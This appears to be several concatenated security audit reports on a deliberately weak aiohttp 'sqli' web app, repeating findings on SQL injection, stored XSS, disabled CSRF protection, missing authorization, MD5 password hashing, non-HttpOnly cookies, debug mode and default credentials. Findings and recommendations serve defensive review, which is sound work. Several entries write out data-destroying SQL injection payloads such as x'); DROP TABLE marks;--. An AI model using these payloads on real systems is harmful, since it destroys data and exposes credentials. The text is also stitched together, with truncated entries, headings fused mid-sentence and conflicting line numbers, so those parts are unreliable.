title: SQL injection in Student.create via string-formatted INSERT
description: Student.create builds the INSERT statement by interpolating the student name directly into the SQL string with Python % formatting, instead of passing it as a query parameter. The name comes straight from unauthenticated user input: views.students() reads data['name'] from a POST to /students/ (no auth, and CSRF is disabled) and passes it to Student.create. An attacker can break out of the quoted VALUES literal and inject arbitrary SQL (e.g. name = "x'); DROP TABLE marks; --" or stacked/sub-query payloads), enabling data exfiltration or modification.
evidence: student.py: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name}); await cur.execute(q). Source: views.py:57 await Student.create(conn, data['name']) where data = await request.post() on POST /students/. Contrast with the parameterized create methods in course.py/review.py/mark.py which pass params to cur.execute.
recommendation: Use a parameterized query: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never build SQL with %/format/f-strings on user input.

title: Autoescaping disabled in Jinja2 enables stored XSS in course/review templates
description: aiohttp_jinja2 is configured with autoescape=False, so any template variable rendered without an explicit | e filter is emitted as raw HTML. Several templates render attacker-controlled, persisted data unescaped: course.jinja2 outputs course.title and course.description ({{ course.title }} line 14, {{ course.description }} line 15) and each review.review_text ({{ review.review_text }} line 22); student.jinja2 outputs course.title/description (lines 19-20). review_text and course title/description are stored via unauthenticated POST endpoints (/courses/{id}/review and /courses/), so an attacker can store <script> payloads that execute in any viewer's browser (including the admin). Because session cookies are not HttpOnly, this leads to session hijacking.
evidence: app.py: setup_jinja(app, loader=..., context_processors=[...], autoescape=False). Sinks: course.jinja2:14-15,22; student.jinja2:19-20. Sources: views.review() -> Review.create(conn, course_id, review_text) with review_text from request.post(); views.courses() -> Course.create(conn, data['title'], data['description']).
recommendation: Enable autoescaping (autoescape=True, or autoescape=select_autoescape(['html','jinja2'])) and remove reliance on manual | e. Keep explicit escaping as defense in depth.

title: CSRF protection middleware disabled for all state-changing POST routes
description: The csrf_middleware (which validates a per-session _csrf_token on POST) is commented out of the application's middleware list, so none of the POST endpoints enforce CSRF tokens. All state-changing actions - login (POST /), create student, create course, submit review, and evaluate/grade a student - accept cross-site forged requests. An attacker can host a page that auto-submits a form to these endpoints and act on behalf of a logged-in victim (e.g. an admin), including creating content with XSS payloads.
evidence: app.py middlewares=[session_middleware, # csrf_middleware, error_middleware]. The csrf_middleware exists and is correct (middlewares.py:25-38) but is never registered. Routes POST / , /students/, /courses/, /students/{..}/evaluate/{..}, /courses/{..}/review (routes.py) are thus unprotected.
recommendation: Re-enable csrf_middleware in the middleware chain and ensure every POST form includes the csrf_token hidden field (most templates already emit it).

title: Missing server-side authorization on state-changing endpoints (student grading, content creation)
description: The evaluate handler assigns marks/grades to students but performs no authorization check - any anonymous client can POST to /students/{id}/evaluate/{course_id} and set a student's points. The UI only shows the evaluate form to admins ({% if auth_user.is_admin %} in course.jinja2:41), but this client-side gating is not enforced on the server. The same missing-authorization pattern applies to views.students (create student, views.py:51-60), views.courses (create course, views.py:83-93), and views.review (create review, views.py:111-131): none use the existing @authorize decorator, so all write operations are fully anonymous. Only logout is protected (views.py:156).
evidence: evaluate() has no @authorize/@authorize(ensure_admin=True) decorator and no is_admin check before Mark.create(conn, student_id, course_id, data['points']). The authorize() decorator in utils/auth.py:12-23 supports ensure_admin but is unused on these handlers. Compare course.jinja2:41 which hides the form behind auth_user.is_admin.
recommendation: Apply @authorize(ensure_admin=True) to evaluate (and any admin-only action) and @authorize() to other write handlers, enforcing permissions server-side rather than only in templates.

title: Passwords hashed with unsalted MD5 and compared non-constant-time
description: User.check_password hashes the supplied password with a single unsalted MD5 and compares it to the stored hash. MD5 is fast and broken for password storage: stored hashes (also seeded as md5('...') in migrations/001-fixtures.sql) are trivially cracked via rainbow tables/brute force, and lack of per-user salt means identical passwords yield identical hashes. The comparison with == is also not constant-time, allowing theoretical timing analysis.
evidence: user.py: return self.pwd_hash == md5(password.encode('utf-8')).hexdigest(); fixtures: md5('superadmin'), md5('password'), md5('spidey').
recommendation: Use a slow, salted password hash (bcrypt/scrypt/argon2) via a vetted library, and compare using a constant-time function (e.g. the library's verify). Rehash existing credentials on next login.

title: Session cookies issued without HttpOnly flag
description: The RedisStorage session backend is instantiated with httponly=False, so the session cookie is readable from JavaScript (document.cookie). Combined with the stored XSS enabled by disabled autoescaping, an attacker's injected script can exfiltrate the session cookie and hijack authenticated (including admin) sessions.
evidence: middlewares.py: storage = RedisStorage(app['redis'], httponly=False).
recommendation: Remove httponly=False (default is True) and also set secure=True and an appropriate samesite policy for the session cookie.

title: Application runs with debug mode enabled
description: The aiohttp Application is created with debug=True unconditionally. Debug mode enables extra diagnostics and more verbose error behavior, which can leak internal details and increases attack surface in production. It is hard-coded rather than driven by configuration/environment.
evidence: app.py: app = Application(debug=True, middlewares=[...]).
recommendation: Drive debug from configuration/environment and default it to False in production deployments.

title: SQL injection in Student.create via string-formatted INSERT
description: Student.create builds the INSERT statement by Python %-formatting the raw `name` into the SQL string instead of passing it as a bound parameter. The value comes straight from attacker-controlled POST data: views.students (sqli/views.py:57) calls Student.create(conn, data['name']) with no validation, and the /students/ POST route (sqli/routes.py:14) has no authentication, so any anonymous user can inject SQL. A payload in the `name` field (e.g. breaking out of the quoted VALUES and appending stacked statements or a subquery) executes with the app's full DB privileges, allowing data exfiltration (including users.pwd_hash) or modification.
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})  -> await cur.execute(q). Source: data['name'] from POST /students/ in views.py:55-57. Contrast with the safe parameterized queries elsewhere (e.g. Course.create uses cur.execute(q, {...})).
recommendation: Use a parameterized query: cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never interpolate user input into SQL text.

title: Stored XSS enabled by disabling Jinja2 autoescape globally
description: aiohttp_jinja2 is configured with autoescape=False, so no template output is HTML-escaped. User-controlled values are rendered directly into HTML, e.g. review.review_text in course.jinja2:22, course.title/description, and student.name in students.jinja2:16. Reviews can be created by unauthenticated users (POST /courses/{id}/review, views.py:111-131, no auth), so an attacker can store a <script> payload that executes in every visitor's browser (including an admin), enabling session hijacking and admin-action forgery.
evidence: setup_jinja(app, loader=..., context_processors=[...], autoescape=False). Sink example: course.jinja2 line 22 `{{ review.review_text }}` rendered without escaping; review_text stored verbatim via Review.create (review.py:28-36).
recommendation: Enable autoescaping (autoescape=True, the aiohttp_jinja2 default) and only mark explicitly-trusted content safe. Validate/encode user input.

title: CSRF protection middleware disabled
description: A working CSRF-token middleware exists (sqli/middlewares.py:25-38) and templates emit the token, but it is commented out of the application middleware list, so no POST request is checked for a CSRF token. All state-changing endpoints (login, create student, create course, create review, evaluate/grade, logout) accept forged cross-site POSTs. Combined with the missing per-handler auth checks, an attacker page can cause an authenticated admin's browser to perform privileged actions.

recommendation: Re-enable csrf_middleware in the middleware chain and ensure all forms submit the token (they already render csrf_token()).

title: Missing server-side authorization on state-changing endpoints
description: Access control is enforced only in templates (e.g. course.jinja2:41 shows the grading form only to admins), but the handlers perform no authorization. The evaluate handler, which records student marks (an admin-only action), has no @authorize decorator and is reachable by any anonymous client via POST /students/{id}/evaluate/{course_id}. The same gap applies to students (create student, views.py:51-60), courses (create course, views.py:83-93) and review (create review, views.py:111-131) — none check get_auth_user/authorize, so any unauthenticated user can create or modify data. Only logout uses @authorize.
evidence: async def evaluate(request): ... await Mark.create(conn, student_id, course_id, data['points']) with no authorize() decorator; routes.py:21-23 maps POST to it unauthenticated. Compare logout (views.py:156) which does use @authorize().
recommendation: Apply @authorize()/@authorize(ensure_admin=True) (sqli/utils/auth.py) to every state-changing handler per its required privilege level rather than relying on template-only checks.

title: Passwords hashed with unsalted MD5
description: User.check_password compares the stored hash to a plain unsalted MD5 of the password, and fixtures store md5(password) (migrations/001-fixtures.sql:10-13). MD5 is fast and unsalted, so if the users table is leaked (e.g. via the SQL injection above) passwords are trivially recovered with rainbow tables/brute force. Identical passwords also produce identical hashes.

recommendation: Use a slow, salted password hash such as bcrypt/scrypt/argon2 and compare with a constant-time verifier.

title: Session cookie set without HttpOnly flag
description: The Redis session storage is created with httponly=False, so the session cookie is accessible to client-side JavaScript. Together with the stored XSS enabled by autoescape=False, an injected script can read document.cookie and exfiltrate a victim's (including admin's) session, leading to full account takeover.
evidence: storage = RedisStorage(app['redis'], httponly=False)
recommendation: Remove the httponly override (default is True) and also set secure=True and an appropriate SameSite attribute for the session cookie.

title: Application runs with debug mode enabled

title: Unauthenticated SQL injection in Student.create
description: Student.create builds the INSERT statement by Python string interpolation of the user-supplied name instead of using a parameterized query. The value flows unescaped from an HTTP request into the SQL text. It is reached from views.students (sqli/views.py:54-57) on POST /students/, a route that performs no authentication check (sqli/routes.py:14) and whose CSRF protection is disabled (sqli/app.py:27). Any anonymous visitor can POST name=<payload> to inject arbitrary SQL. Because the single quotes are placed by the template, a payload such as x'); DROP TABLE students;-- or a stacked/subquery injection yields full read/write/DDL on the database. This is the clearest representative of injection in the code; all other DAO methods correctly parameterize.

recommendation: Use a parameterized query: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}); never interpolate request data into SQL text.

title: Stored XSS from globally disabled Jinja2 autoescaping

User-controlled, persisted values are then rendered raw into HTML: course.title and course.description and review.review_text (sqli/templates/course.jinja2:14-15,22) and student name (sqli/templates/students.jinja2:16). An attacker submits a review (POST /courses/{id}/review), a course (POST /courses/), or a student name (POST /students/) containing <script>...</script>; it executes in every visitor's browser, including admins. title: CSRF protection middleware disabled application-wide
description: The csrf_middleware is commented out in the middleware list, so none of the state-changing POST endpoints (login at /, create student, create course, create review, evaluate/assign marks, logout) validate the _csrf_token the templates emit. recommendation: Add csrf_middleware back to the Application middlewares list so POST requests are rejected unless a valid session-bound _csrf_token is supplied.

title: Session cookie set with HttpOnly disabled

Given the stored-XSS exposure above, an attacker's injected script can exfiltrate the session cookie (document.cookie) and hijack any user's session, including the admin. No Secure flag is set either, allowing interception over plaintext HTTP.
evidence: storage = RedisStorage(app['redis'], httponly=False)
recommendation: Use httponly=True (the default) and set secure=True so the session cookie is inaccessible to JS and only sent over HTTPS.

title: Stored XSS enabled by autoescape=False in Jinja2 setup
description: aiohttp_jinja2 is configured with autoescape=False, so no template output is HTML-escaped. User-controlled values are rendered verbatim, producing stored/reflected XSS. Concretely, course review text is written by any anonymous user (POST /courses/{id}/review, sqli/views.py:129) with no sanitization and later rendered raw at sqli/templates/course.jinja2:22, and student names are rendered raw at sqli/templates/students.jinja2:16 (names are also the SQLi sink). An attacker can submit <script>...</script> that executes in every visitor's browser, including admins, enabling session/credential theft (worsened by HttpOnly being off).

Sinks: {{ review.review_text }} (course.jinja2:22), {{ name }} (students.jinja2:16), {{ course.description }} (course.jinja2:15). Source: Review.create(conn, course_id, review_text) from request.post() (views.py:120-129).

title: Unsalted MD5 used for password hashing and verification
description: Passwords are stored and verified as unsalted MD5 hashes. MD5 is extremely fast and broken for this purpose; combined with no per-user salt, stored hashes (e.g. exfiltrated via the SQL injection above) are trivially reversed with rainbow tables or brute force. The seed data confirms the scheme (migrations/001-fixtures.sql:10-13 uses md5('superadmin') etc.). The comparison also uses a non-constant-time == on the hex digest (minor timing leak).

recommendation: Use a memory-hard, salted KDF such as argon2id or bcrypt (e.g. passlib/argon2-cffi), migrate stored hashes, and compare using the library's verify (constant-time).

title: CSRF protection middleware defined but not enabled
description: A working CSRF-validation middleware exists (sqli/middlewares.py:25-38) and templates render a _csrf_token hidden field, but the middleware is commented out of the application's middleware list, so no POST request's token is ever checked. All state-changing endpoints (login at POST /, create student, create course, submit review, evaluate marks, logout) are therefore vulnerable to cross-site request forgery: an attacker page can force an authenticated admin's browser to create records, assign marks, or log out.
evidence: middlewares=[session_middleware, # csrf_middleware, error_middleware] (sqli/app.py:25-29); the csrf_middleware that pops/validates session['_csrf_token'] vs formdata is fully implemented at sqli/middlewares.py:25-38 but never registered.

title: Missing authorization on state-changing endpoints (evaluate, student/course/review creation)
description: The evaluate handler assigns marks to students with no authentication or admin check — it is only gated in the UI by a template condition (course.jinja2:41 {% if auth_user.is_admin %}), which an attacker simply ignores by POSTing directly to /students/{id}/evaluate/{course_id}. title: Session cookie set without HttpOnly flag

title: Unauthenticated SQL injection in Student.create
description: Student.create builds its INSERT by interpolating the student name directly into the SQL text with Python %-formatting instead of using a bound parameter. The name originates from unauthenticated user input: views.students handles POST /students/ with no authorization check and passes data['name'] straight to Student.create (sqli/views.py:54-57, routes.py:13-14). An attacker can inject arbitrary SQL by closing the quoted literal, e.g. name = x'); DROP TABLE marks;-- , enabling data exfiltration (via stacked/boolean queries), modification, or destruction against the PostgreSQL backend. This is the canonical vulnerability of the app and is directly reachable by any anonymous visitor.
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})  -> cur.execute(q). Source: views.students POST -> Student.create(conn, data['name']). Contrast with the safe parameterized queries elsewhere (e.g. Course.create uses cur.execute(q, {'title': title, ...})).
recommendation: Use a parameterized query and let the driver bind the value: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never build SQL with %/f-strings/concatenation from request data.

title: Jinja2 auto-escaping globally disabled enabling stored/reflected XSS
description: The Jinja2 environment is configured with autoescape=False, so every template expression renders HTML unescaped unless it explicitly adds the |e filter. Numerous templates emit attacker-controlled, persisted data without escaping, giving stored XSS. The strongest instance is course review text: any user can POST a review (POST /courses/{id}/review, no auth) with an HTML/script payload, which is stored and later rendered raw in course.jinja2:21 ({{ review.review_text }}). Other unescaped sinks fed by user input include course.jinja2:14-15 (course.title/description), courses.jinja2:17-18, students.jinja2:16, and the login error list in index.jinja2. Because the session cookie is also readable by JavaScript (HttpOnly=false), an injected script can steal an admin's session and fully take over the account.
evidence: setup_jinja(app, loader=PackageLoader('sqli','templates'), context_processors=[...], autoescape=False). Sink example: sqli/templates/course.jinja2:21 `{{ review.review_text }}` rendered without |e; review_text comes from Review.create(conn, course_id, review_text) via views.review POST with no sanitization.
recommendation: Enable autoescaping: pass autoescape=True (or use jinja2.select_autoescape(['html','jinja2'])) to aiohttp_jinja2.setup, and remove reliance on manual |e. Keep |safe only for values proven to be trusted HTML.

title: Passwords hashed with unsalted MD5 and compared non-constant-time
description: check_password hashes the supplied password with a single round of unsalted MD5 and compares it to the stored hash. MD5 is cryptographically broken and extremely fast to brute-force; unsalted single-round hashes are trivially reversible with rainbow tables, so any disclosure of the users.pwd_hash column (e.g. via the SQL injection above) immediately yields plaintext passwords. The seed data confirms this scheme (migrations/001-fixtures.sql:10-13 stores md5('superadmin') etc.). The comparison also uses Python '==' on the hash, which is not constant-time (CWE-208), though that is secondary to the hashing weakness.
evidence: return self.pwd_hash == md5(password.encode('utf-8')).hexdigest()  (import: from hashlib import md5). Fixtures: pwd_hash = md5('superadmin') / md5('password').
recommendation: Use a memory-hard, salted password hash such as Argon2id (argon2-cffi) or bcrypt, store the full algorithm/salt/parameters, and verify with the library's constant-time verify function. Migrate existing hashes on next login.

title: CSRF protection middleware disabled
description: A CSRF-checking middleware exists (sqli/middlewares.py:25-38) and templates render a _csrf_token hidden field, but the middleware is commented out of the application's middleware chain, so no CSRF validation ever runs. Combined with the cookie-based session, every state-changing POST (login, logout, create student, create course, create review, evaluate/assign marks) is vulnerable to cross-site request forgery: an attacker page can silently submit these forms using a victim's authenticated session. For an admin victim this allows forced course/mark creation; for any visitor it allows forced login/logout and data creation.
evidence: middlewares=[session_middleware, # csrf_middleware,  error_middleware]. The csrf_middleware factory (middlewares.py:26) is never referenced in the active list.
recommendation: Re-enable a CSRF middleware in the chain and enforce token checks on all unsafe methods. Fix the token comparison to be constant-time, and pair with SameSite cookies. Also note middlewares.py:32 compares tokens with != (non-constant-time) and should use hmac.compare_digest.

title: Missing server-side authorization on state-changing endpoints
description: Authorization is enforced only in the UI (templates hide forms behind {% if auth_user.is_admin %}), not on the server. The evaluate handler, which assigns student marks and is presented as an admin-only action, has no @authorize decorator and no is_admin check, so any unauthenticated client can POST /students/{id}/evaluate/{course_id} to create marks. The same missing-authorization flaw affects views.students POST (create student, views.py:54-57), views.courses POST (create course, views.py:86-90), and views.review POST (create review, views.py:119-130) — all reachable without authentication. The authorize() decorator (sqli/utils/auth.py:12-23) exists but is applied only to logout.
evidence: @template('evaluate.jinja2') async def evaluate(request): ... await Mark.create(conn, student_id, course_id, data['points']) — no get_auth_user/authorize call. Route POST /students/{student_id}/evaluate/{course_id} (routes.py:21-23). UI gate only: course.jinja2:41 `{% if auth_user.is_admin %}`.
recommendation: Apply server-side authorization to every state-changing handler: decorate with @authorize() (and @authorize(ensure_admin=True) for admin-only actions like evaluate and course creation), and verify permissions on the server regardless of what the UI shows.

title: Session cookie set without HttpOnly (and without Secure)
description: The Redis session storage is constructed with httponly=False, so the session cookie is readable by client-side JavaScript. Given the stored XSS reachable through course reviews (and the globally disabled auto-escaping), an injected script can read document.cookie and exfiltrate an administrator's session, converting XSS into full account takeover. No Secure flag is set either, so the cookie can traverse plaintext HTTP.
evidence: storage = RedisStorage(app['redis'], httponly=False) in session_middleware.
recommendation: Construct RedisStorage with httponly=True and secure=True (serve over HTTPS), and set samesite='Lax'/'Strict'. There is no legitimate reason for the session cookie to be script-accessible.

title: aiohttp application debug mode enabled in production path
description: The Application is created with debug=True, and the error templates render exception internals to the client (errors/50x.jinja2:6 renders error.__dict__). Together these can disclose stack traces, internal object state, and configuration details to attackers, aiding further exploitation. run.py also sets logging level to DEBUG globally.
evidence:
app = Application(debug=True, middlewares=[...]). Error template: `
{{ error.__dict__ }}
` in sqli/templates/errors/50x.jinja2.
recommendation: Disable debug mode in deployed environments (drive it from config/env), and never render exception internals (error.__dict__, stack traces) to clients — log them server-side and show a generic error page.

title: SQL injection in Student.create via unparameterized name interpolation
description: Student.create builds the INSERT statement by Python %-formatting the attacker-controlled `name` directly into the SQL string, bypassing the driver's parameter binding used everywhere else. It is reachable without authentication: POST /students/ (routes.py:14) calls views.students (views.py:54-57), which passes the raw form field `data['name']` straight into Student.create. An attacker can submit a name like `x'); DROP TABLE marks;--` or use a stacked/subquery payload to read or modify arbitrary data (e.g. exfiltrate the users table / pwd_hash) and tamper with records.
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name}); await cur.execute(q)  — name originates from `data['name']` in views.students (views.py:57), which comes from unauthenticated request.post(). Contrast with Course.create/Review.create which correctly pass params to cur.execute.
recommendation: Use a parameterized query: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never build SQL with %/str.format/f-strings on user input.

title: Stored XSS from globally disabled Jinja2 autoescaping
description: setup_jinja is configured with autoescape=False, so no template output is HTML-escaped. User-controlled values are rendered directly into HTML: course review_text, course title/description, and student name. An unauthenticated attacker can POST a review containing <script>…</script> to /courses/{id}/review (views.review, Review.create) which is then rendered verbatim in course.jinja2 (lines 14, 15, 22) to every visitor including admins, enabling session/credential theft and admin-action forgery (made worse by non-HttpOnly cookies).
evidence: app.py:35 `autoescape=False`. Sinks: course.jinja2:22 `{{ review.review_text }}`, :14 `{{ course.title }}`, :15 `{{ course.description }}`, students.jinja2:16 `{{ name }}`. Sources: Review.create(review_text) from views.review:121-129; Course.create(title, description) from views.courses:89; Student.create(name) from views.students:57.
recommendation: Enable autoescaping (autoescape=True, or autoescape=select_autoescape(['jinja2','html'])) and only mark explicitly-trusted fragments safe.

title: CSRF protection disabled application-wide
description: The csrf_middleware (defined in middlewares.py:25-38) is commented out of the middleware chain, so no POST request's CSRF token is validated even though templates render a token. All state-changing endpoints (login at POST /, student creation, course creation, review creation, student evaluation, logout) accept cross-site forged requests. An attacker page can, e.g., force an authenticated admin's browser to submit grades via POST /students/{id}/evaluate/{course_id} or create records.
evidence: app.py:27 `# csrf_middleware,` commented in the middlewares list; the working validator exists at middlewares.py:25-38 but is never installed. Forms include `_csrf_token` (students.jinja2:36) but nothing checks it server-side.
recommendation: Add csrf_middleware to the Application middlewares list so the token check in middlewares.py runs on every POST.

title: Missing authorization on state-changing endpoints (grade/record manipulation)
description: The evaluate handler performs no authentication or admin check before persisting a mark, so any unauthenticated user can assign grades to any student for any course by POSTing to /students/{student_id}/evaluate/{course_id}. The UI only hides the evaluate form behind `auth_user.is_admin` (course.jinja2:41) but the server never enforces it. The same missing-check pattern applies to views.students (views.py:51-60, anonymous student creation) and views.courses (views.py:83-93, anonymous course creation); only views.logout uses the @authorize decorator. The authorize()/authorize(ensure_admin=True) helper exists (utils/auth.py:12-23) but is not applied to these mutating routes.
evidence: views.evaluate (views.py:134-153) has no @authorize and no get_auth_user check; routes.py:21-23 maps POST to it. Compare utils/auth.py:12-23 authorize decorator used only on logout (views.py:156).
recommendation: Apply @authorize(ensure_admin=True) to evaluate and other admin-only mutations, and @authorize() to student/course/review creation; enforce ownership/role server-side rather than relying on template conditionals.

title: Unsalted MD5 used for password storage and verification
description: Passwords are hashed with a single unsalted MD5. MD5 is fast and broken for password storage: identical passwords yield identical hashes, and offline cracking / rainbow-table lookups are trivial. Combined with the SQL injection above (which can dump pwd_hash from the users table), attacker-recovered admin credentials are highly likely.
evidence: check_password: `return self.pwd_hash == md5(password.encode('utf-8')).hexdigest()` (user.py:41). pwd_hash is read from the users table (user.py:24-28).
recommendation: Use a slow, salted password hash (bcrypt, scrypt, or argon2) and a constant-time comparison; migrate stored hashes on next login.

title: Session cookie set with HttpOnly disabled
description: The Redis session storage is configured with httponly=False, so the session cookie is readable by client-side JavaScript. Together with the stored XSS from disabled autoescaping, this lets injected script read document.cookie and exfiltrate session identifiers to hijack authenticated/admin sessions.
evidence: middlewares.py:20 `storage = RedisStorage(app['redis'], httponly=False)`.
recommendation: Use httponly=True (the default) and also set secure=True and a SameSite attribute for session cookies.

title: aiohttp debug mode enabled in application factory
description: The Application is constructed with debug=True, and run.py sets logging to DEBUG. In production this increases verbosity and can surface internal details and warnings; combined with error pages it broadens information disclosure. Low impact on its own but should not ship enabled.
evidence: app.py:24 `debug=True,` inside Application(...); run.py:11 `logging.basicConfig(level=logging.DEBUG)`.
recommendation: Drive debug and log level from configuration/environment and default to debug=False / INFO in production.

title: Outdated dependencies with known CVEs (aiohttp 3.5.3, jinja2 2.10, pyyaml 3.13)
description: Pinned dependencies are years out of date and carry published CVEs. aiohttp 3.5.3 (server here, with add_static at routes.py:33) has multiple advisories including request smuggling and static-route path traversal (e.g. CVE-2024-23334) fixed in later 3.x releases. jinja2 2.10 is affected by CVE-2019-10906 and CVE-2020-28493. pyyaml 3.13 is affected by CVE-2020-1747/CVE-2020-14343 (unsafe full-load). These raise the baseline risk even beyond the app-level flaws.
evidence: requirements.txt: aiohttp==3.5.3 (line 3), jinja2==2.10 (line 11), pyyaml==3.13 (line 15); add_static used at routes.py:33.
recommendation: Upgrade aiohttp, jinja2, and pyyaml (and transitive deps) to current patched releases; run pip-audit in CI to track advisories.

title: Default/hardcoded PostgreSQL credentials in config
description: The committed config uses the default postgres superuser with a trivial password (postgres/post****). This is the default config loaded by app.py (default_config='./config/dev.yaml') and is shipped into the container image (Dockerfile.app ADDs ./config). If deployed as-is, the database is reachable with well-known default credentials; the Postgres service is also published on 5432 in docker-compose.yml.
evidence: config/dev.yaml:1-3 user: postgres / password: post**** ; app.py:18 default_config='./config/dev.yaml'; docker-compose.yml exposes 5432:5432.
recommendation: Inject DB credentials from environment/secrets, use a non-superuser least-privilege role, and do not expose the database port publicly; rotate any credential that was ever deployed.

title: Unauthenticated SQL injection in Student.create via student name
description: Student.create builds the INSERT statement with Python string interpolation of the attacker-controlled 'name' value instead of a parameterized query. The value flows unfiltered from the POST /students/ handler (views.students, line 57: Student.create(conn, data['name'])), which performs no authentication check, so any anonymous visitor can inject arbitrary SQL. Because the input is wrapped in single quotes, a payload like  x'); DROP TABLE marks;--  or a stacked/UNION query breaks out of the string literal. With PostgreSQL this permits reading the users table (including pwd_hash of superadmin), data destruction, or privilege changes. This is the most severe issue in the codebase. (Other DAO methods correctly parameterize; this is the sole string-formatted sink.)
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})  then cur.execute(q)  — name originates from unauthenticated request.post()['name'] in views.students (line 54-57).
recommendation: Use a parameterized query: cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never interpolate user input into SQL text.

title: Stored XSS from globally disabled Jinja2 autoescaping
description: aiohttp_jinja2 is configured with autoescape=False, so no template output is HTML-escaped. User-controlled data persisted to the database is rendered verbatim, producing stored XSS. The clearest sink is course review text (templates/course.jinja2:22 {{ review.review_text }}), created by the unauthenticated POST /courses/{id}/review endpoint (views.review line 129). Other reflected/stored sinks include student.name (templates/students.jinja2:16), course.title/description (templates/course.jinja2:14-15), and login error strings. An attacker submits a review containing <script>...</script> that executes in every visitor's browser; combined with the non-HttpOnly session cookie it enables session hijacking.
evidence: setup_jinja(app, loader=..., context_processors=[...], autoescape=False) — and templates emit {{ review.review_text }}, {{ name }}, {{ course.description }} without |e or escaping.
recommendation: Set autoescape=True (the Jinja2 default) and explicitly mark only trusted content as safe. Remove autoescape=False.

title: CSRF protection middleware disabled on all state-changing POST routes
description: A working csrf_middleware exists (middlewares.py:26-38) and templates embed _csrf_token hidden fields, but the middleware is commented out of the application's middleware list, so no CSRF token is ever validated. Every POST route (login, create student, create course, create review, evaluate/assign marks, logout) is therefore vulnerable to cross-site request forgery. An attacker can host a page that auto-submits a form to /courses/{id}/review or /students/{id}/evaluate/{course_id} against an authenticated victim.
evidence: middlewares=[session_middleware, # csrf_middleware, error_middleware] — csrf_middleware line is commented, and no handler calls token validation.
recommendation: Re-enable csrf_middleware in the middleware chain and ensure all POST handlers receive a valid, session-bound token.

title: Missing authorization on state-changing endpoints (mark evaluation, create student/course/review)
description: The evaluate handler assigns grades (Mark.create) to students and is treated as an admin-only action in the UI (course.jinja2:41 gates the evaluate form behind auth_user.is_admin), but the server performs no authentication or admin check — there is no @authorize(ensure_admin=True) decorator and no user lookup. Any anonymous client can POST to /students/{id}/evaluate/{course_id} and forge marks. The same missing-auth pattern applies to views.students (create student, line 51-60), views.courses (create course, line 83-93) and views.review (create review, line 111-131): all mutate data without requiring a logged-in user. The authorize() decorator exists (utils/auth.py:12) but is only used on logout.
evidence: async def evaluate(request): ... await Mark.create(conn, student_id, course_id, data['points']) — no get_auth_user/authorize call; compare course.jinja2:41 {% if auth_user.is_admin %} which the server never enforces.
recommendation: Apply @authorize(ensure_admin=True) to evaluate and @authorize() (or admin where appropriate) to the create endpoints, enforcing the privilege server-side rather than only in templates.

title: Weak unsalted MD5 password hashing in User.check_password
description: Passwords are hashed with a single unsalted MD5 (check_password compares md5(password) to the stored pwd_hash; fixtures seed users the same way, e.g. md5('superadmin') for the admin). MD5 is fast and broken for password storage: identical passwords yield identical hashes (no salt), and the hashes fall instantly to rainbow tables / GPU cracking. If the users table is read (e.g. via the SQL injection above), every password is trivially recovered, including the admin account.
evidence: return self.pwd_hash == md5(password.encode('utf-8')).hexdigest() ; migrations/001-fixtures.sql:10 VALUES ('Super', NULL, 'Admin', 'superadmin', md5('superadmin'), TRUE).
recommendation: Use a slow, salted password hash (bcrypt, scrypt, or Argon2) and migrate existing hashes; compare with constant-time verification provided by the hashing library.

title: Session cookie set with HttpOnly disabled
description: The RedisStorage session backend is instantiated with httponly=False, so the session cookie is readable by client-side JavaScript. Combined with the stored XSS (autoescape disabled), an injected script can exfiltrate the session cookie via document.cookie and hijack authenticated sessions, including the admin's.
evidence: storage = RedisStorage(app['redis'], httponly=False)
recommendation: Remove httponly=False (default is True) and also set secure=True and an appropriate SameSite attribute for the session cookie.

title: aiohttp application debug mode enabled
description: The Application is constructed with debug=True (and run.py configures DEBUG-level logging). In a deployed instance this enables verbose diagnostics and more detailed error behavior that can leak internal information to attackers. It should not be hardcoded on for production.
evidence: app = Application(debug=True, middlewares=[...])
recommendation: Drive debug from configuration/environment and default it to False; keep logging at INFO or higher in production.

title: Default/hardcoded database credentials in committed config
description: The database section ships default credentials (user postgres / password postgres****) committed to the repository and used directly to build the DSN in services/db.py. These are development defaults, but hardcoded credentials in source are routinely reused in deployment and should be externalized; if this config reaches a real environment the DB is trivially accessible. Rotate if ever used beyond local development.
evidence: db: user: postgres / password: postgres**** / host: postgres (consumed by services/db.py:15-18 dsn format).
recommendation: Load credentials from environment variables or a secrets manager; keep only placeholders in committed config and rotate any credential that has been used outside local dev.

title: Unauthenticated SQL injection in Student.create
description: Student.create builds the INSERT statement with Python string interpolation ('%(name)s' % {'name': name}) instead of a parameterized query. The name value is attacker-controlled: views.students (sqli/views.py:54-57) reads data['name'] from an unauthenticated POST to /students/ (route sqli/routes.py:14) and passes it straight to Student.create with no validation. An attacker can submit a name such as x'); DROP TABLE students;-- or a stacked/sub-select payload to read, modify or destroy any data in the database and, via PostgreSQL, potentially escalate further. This is the only DAO method using string formatting; all others correctly parameterize.
evidence: q = ("INSERT INTO students (name) VALUES ('%(name)s')" % {'name': name}); cur.execute(q)  <- name flows from request.post()['name'] in views.students (sqli/views.py:57) with no sanitization and no auth check.
recommendation: Use a parameterized query: cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never build SQL with % / f-strings on user input.

title: Global Jinja2 autoescape disabled enabling stored XSS via review text and student names
description: aiohttp_jinja2 is configured with autoescape=False, so all template variables are rendered as raw HTML unless an explicit |e filter is used. User-controlled values are rendered without escaping, e.g. review.review_text at sqli/templates/course.jinja2:22 and student name at sqli/templates/students.jinja2:16 and course.title/description at course.jinja2:14-15. An attacker can POST a review containing <script>...</script> to /courses/{id}/review (unauthenticated) which is then stored and executed in every visitor's browser (stored XSS). Combined with the non-HttpOnly session cookie, this allows session hijacking.
evidence: setup_jinja(app, ..., autoescape=False) at sqli/app.py:35; sink example: '{{ review.review_text }}' at sqli/templates/course.jinja2:22, value created from unsanitized data['review_text'] in views.review (sqli/views.py:121-129).
